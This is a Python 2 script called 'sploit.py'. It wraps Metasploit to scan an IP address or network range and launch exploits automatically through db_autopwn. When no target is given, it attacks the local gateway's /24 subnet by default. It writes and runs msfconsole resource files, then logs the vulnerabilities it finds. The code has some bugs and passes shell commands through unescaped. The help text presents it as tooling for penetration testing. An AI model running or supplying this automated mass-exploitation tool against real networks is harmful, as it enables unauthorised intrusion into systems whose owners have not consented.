#!usr/bin/python
import subprocess ,sys, os

#########################################################
# Author: Mika Ayenson
# Title: Sploit
# 
#
# This script is used to generate a resourcefile2 to be 
# used with metasploit.  It takes as input an xml file and
# outputs a resource file that can be passed with the
# 'msfconsole -r' option. 
#
#########################################################

#Global Variables
address = ""   #for the ip address of machines to exploit
verbose = False #to set the verbose variable
logfile = "sploitfile" #the name of outfile
vulnsf = "vulnsfound"
listvulns = [] #list of vulnerabilities

#########################################################
# Validate Ip addresses
#
#########################################################
def valid_ip(ip):
  ip = ip + "/24" #default
  cider = ip.split('/') #cidr
  octets = cider[0].split('.')
  if (len(octets)==4 and all(digit.isdigit() for digit in octets) and 
  all(0<=int(digit) <= 255 for digit in octets) and cider[1].isdigit()) != True:
    print "Please enter a valid ip. Try: 'python sploit.py -h' for valid ip addresses."
    return False
  else:
    return True
  
#########################################################
# Help 
# This section is used to create a help for the user
#
#########################################################
def help_cmd():
  
  print "Usage:python sploit.py [Options] {target specification}\n"
  print "DESCRIPTION:"
  print "\tsploit.py is meant to wrap a few metasploit functions like 'msfconsole'.  It uses the"
  print "\tpower of metasploit to automate testing exploits. This is not meant to replace existing"
  print "\tmetasploit tools like fastrack or autopwn, it only uses other metasploit commands to "
  print "\tfunction like them. sploit.py executes exploits and immediately exits the session."
  print "\tThis script was written as a module to sztakiframework.py, however can be used"
  print "\tseperately. Please use wisely.\n"
  print "TARGET SPECIFICATION:"
  print "\tCan pass IP addresses, networks, CIDR format. No target defaults to gateway."
  print "\tEX: 192.168.0.1, 192.168.0.1/24, localhost\n"
  print "Specific options:"
  print "\t-v {target}, --verbose {target}: prints output to STDOUT, default is very silent."
  print "\t-h, --help: print this help summary page.\n"
  print "Output option:"
  print "\tpython sploit.py {target specification} <filename>\n"
  print "Examples:"
  print "\tpython sploit.py"
  print "\tpython sploit.py -v localhost"
  print "\tpython sploit.py -v 192.168.0.1"
  print "\tpython sploit.py -v 192.168.0.1/16"
  print "\tpython sploit.py -v 192.168.0.1/24 outfile.txt\n"
  print "AUTHOR"
  print "\tWritten by Mika D. Ayenson\n"
  print "REPORTING BUGS"
  print "\tThis is an open source project, but you can report sploit.py bugs to rdaemon@gmail.com\n"
  print "DISCLAIMER"
  print "\tBy using this tool, you agree to use it in compliance to metasploit aggreements."
  print "\tYou solely are responsible for any mishaps or legal binds you get in.\n"

#########################################################
# line_args
# This section is used to parse command line arguements
#
#########################################################
def line_args(command):
  global address
  if command == "-h" or command == "--help":
    print "Called Sploit help \n"
    help_cmd()
    sys.exit(1)
  elif command == "-v" or command == "--verbose":
    print "Called verbose mode. This may take a few moments. Please be patient and enjoy the noise. =)"
    global verbose 
    verbose = True
  elif command == "localhost":
    print "Localhost selected. Using ip address: 127.0.0.1"
    address = "127.0.0.1"
    return True
  elif valid_ip(command) == True:
    print "Ip address specified: "+command
    address = command
    return True
  else:
    print "Command not recognized."
    sys.exit(1)
  return False  
    
#########################################################
# Collect command line arguements.
# This section either accepts an ip address or uses the
# default gw/24 if no ip address is specified. If there 
# was an invalid ip, a user can use the help.
#
#########################################################
def getCmdArgs():
  if(len(sys.argv)) == 1:
    #default
    address = subprocess.Popen(["route | tail -1 | cut -d' ' -f1"],shell=True,stdout=subprocess.PIPE).communicate()[0].strip()
    address.wait()
    print "No ip was specified. Using default ip range " + address + "\n"
    print "Please wait while exploiting is in progress, this will take some time. You can also use '-v' verbose mode for more output. \n"
    
    #only ip address specified
  elif(len(sys.argv)) == 2:
    if(line_args(sys.argv[1])==True):
	print "Please wait while exploiting is in progress. You can also use '-v' verbose mode for more output. \n"
    else:
      print "Please input a valid ip. Try: 'python sploit.py -h'"
      sys.exit(1)
    
    # ip address and extra arguement specified  
  elif(len(sys.argv)) == 3:
    if line_args(sys.argv[1]):
      global vulnsf
      vulnsf = sys.argv[2]
      print "Using: '"+vulnsf+"' as the name of your output file.  If you have made a mistake, try: 'python sploit.py -h' for proper syntax.\n"
    elif sys.argv[1]=="-v" or sys.argv[2]=="--verbose":
      if line_args(sys.argv[2])==False:
	sys.exit(1)
      
    #change the outfile name
  elif(len(sys.argv)) == 4:
    logfile = sys.argv[3]
    line_args(sys.argv[2])
    line_args(sys.argv[1])
    print "Using: '"+vulnsf+"' as the name of your output file\n"
  else:
    print "Try: 'python sploit.py -h'\n"
    sys.exit(1)

def getVulns(proc): #get vulnerabilities from the metasploit database
  global listvulns
  global logfile
  output = open(logfile,'a')
  while True:
    line = proc.stdout.readline()
    if line != '':
      if "Vuln" in line:
	listvulns.append(line)
      output.write(line)  
      if verbose==True:
	print "sploit: ",line
      #pass
      elif verbose == False:
	pass
    else:
      break
  output.close()

##########################################################
## This section creates a resourcefile to be passed to the
## msfconsole along with the ip range address variable.
## -q will quiet the banner from printing
## -r executes the specified resource file
##
##########################################################  
def pullExploits(address): #gets an update of exploits from metasploit
  resourcefile1 = open('resourcefile1','w')                     #open a new resourcefile1 with initial configuration
  resourcefile1.write("hosts -d\n")
  resourcefile1.write("load pentest\n")
  resourcefile1.write("load db_autopwn\n")
  resourcefile1.write("network_discover -r "+address+"\n")
  resourcefile1.write("db_nmap -sV -T5 -O -F -vv --version-light "+address+"\n")
  resourcefile1.write("db_autopwn -p -b -e "+address+"\n")
  resourcefile1.write("exit -y\n")
  resourcefile1.close()
  print "First train to neverland...\n"  
  proc = subprocess.Popen("msfconsole -r resourcefile1",shell=True,stdout=subprocess.PIPE) 
  getVulns(proc)
  proc.wait()

##########################################################
## Call msfconsole and pass it a resource file
## -q will quiet the banner from printing
## -r executes the specified resource file
## -o outputs to the specified output file
##
##########################################################
def testExploit():
  resourcefile = open('resourcefile2','a')                     #open a new resourcefile2 with ips and eploits
  resourcefile.write("vulns\n")
  resourcefile.write("hosts -d\n")
  resourcefile.write("exit -y\n")
  resourcefile.write("exit -y\n")
  resourcefile.close()            
  print "Last Train Home...\n"
  proc2 = subprocess.Popen("msfconsole -r resourcefile2 ",shell=True,stdout=subprocess.PIPE)
  getVulns(proc2)
  proc2.wait()

##########################################################
## Clean up and remove unnecesary files.
## 
##########################################################
def cleanUp():
  rem = subprocess.Popen("rm resourcefile*",shell=True,stdout=subprocess.PIPE)
  getVulns(rem)
  rem.wait()

def msfupdate():
  update = subprocess.Popen("msfupdate",shell=True,stdout=subprocess.PIPE)
  while True:
    line = update.stdout.readline()
    if line != '':
      if verbose==True:
	print "sploit: ",line
      elif verbose == False:
	pass
    else:
      break
  update.wait()

#########################################################
# STILL_TODO
# this will later out to database not file
#########################################################
#OUTPUT TO DATABASE
def outToDb():
  global vulnsf  
  outfile = open(vulnsf,'w')                  
  for items in listvulns:
    if verbose==True:
      print "sploit: ",items
    elif verbose == False:
      pass
    outfile.write("sploit: "+items)
  outfile.close()
  #out to db

#main
def main():
  print "Welcome to Sploit\n"
  getCmdArgs()
  global address
  os.system("rm "+logfile)
  msfupdate()
  pullExploits(address)
  testExploit()
  global vulnsf
  print "You can now view the file '"+vulnsf+"' \n"
  cleanUp()
  outToDb()
  
if __name__ =="__main__":
  main()
  sys.exit(1)
